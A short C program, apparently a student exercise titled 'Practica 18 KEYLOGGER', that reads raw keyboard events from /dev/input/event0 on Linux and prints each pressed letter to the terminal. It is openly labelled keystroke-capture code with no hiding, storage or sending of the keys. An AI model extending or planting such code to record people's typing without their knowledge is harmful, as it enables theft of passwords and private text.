/*
ARRIETA JIMENEZ DIANA LAURA
PRACTICA 18
KEYLOGGER
*/

#include<stdio.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<linux/input.h>
#include<sys/types.h>

int main ()
{

	int fd;
	char *archivo="/dev/input/event0";
	//char buf[256];
	//int ev;
	struct input_event ev;

	fd=open(archivo,O_RDONLY);

	if(fd==-1)
		fprintf(stderr,"No se pudo abrir el descriptor de archivo");

	printf("Descriptor de archivo: %d\n",fd);

	while(1)
	{
		read(fd,&ev,sizeof(struct input_event));
		if(ev.type==1 )
		{
			if(ev.value==1)
			{
				switch (ev.code)
				{
					case 16:
						printf("q\n");
					break;
					case 17:
                	                        printf("w\n"); 
                        	        break; 
					case 18:
                	                        printf("e\n"); 
                        	        break; 
					case 19:
        	                                printf("r\n"); 
                	                break;
					case 20:
                                                printf("t\n");
                                        break;
                                        case 21:
                                                printf("y\n"); 
                                        break; 
                                        case 22:
                                                printf("u\n"); 
                                        break; 
                                        case 23:
                                                printf("i\n"); 
                                        break; 
					case 24:
                                                printf("o\n");
                                        break;
                                        case 25:
                                                printf("p\n"); 
                                        break; 
                                        case 30:
                                                printf("a\n"); 
                                        break; 
                                        case 31:
                                                printf("s\n"); 
                                        break; 
					case 32:
                                                printf("d\n");
                                        break;
                                        case 33:
                                                printf("f\n"); 
                                        break; 
                                        case 34:
                                                printf("g\n"); 
                                        break; 
                                        case 35:
                                                printf("h\n"); 
                                        break; 
					case 36:
                                                printf("j\n");
                                        break;
                                        case 37:
                                                printf("k\n"); 
                                        break; 
                                        case 38:
                                                printf("l\n"); 
                                        break; 
                                        case 44:
                                                printf("z\n"); 
                                        break; 
					case 45:
                                                printf("x\n");
                                        break;
                                        case 46:
                                                printf("c\n"); 
                                        break; 
                                        case 47:
                                                printf("v\n"); 
                                        break; 
                                        case 48:
                                                printf("b\n"); 
                                        break; 
					case 49:
                                                printf("n\n");
                                        break;
                                        case 50:
                                                printf("m\n"); 
                                        break; 
                                        case 51:
                                                printf(",\n"); 
                                        break; 
                                        case 52:
                                                printf(".\n"); 
                                        break;
					default:
						printf("\n");
					break; 
				}
			}
		}
	}


	if(close(fd)==-1)
		fprintf(stderr,"No se pudo cerrar el descriptor de archivo");
	





}
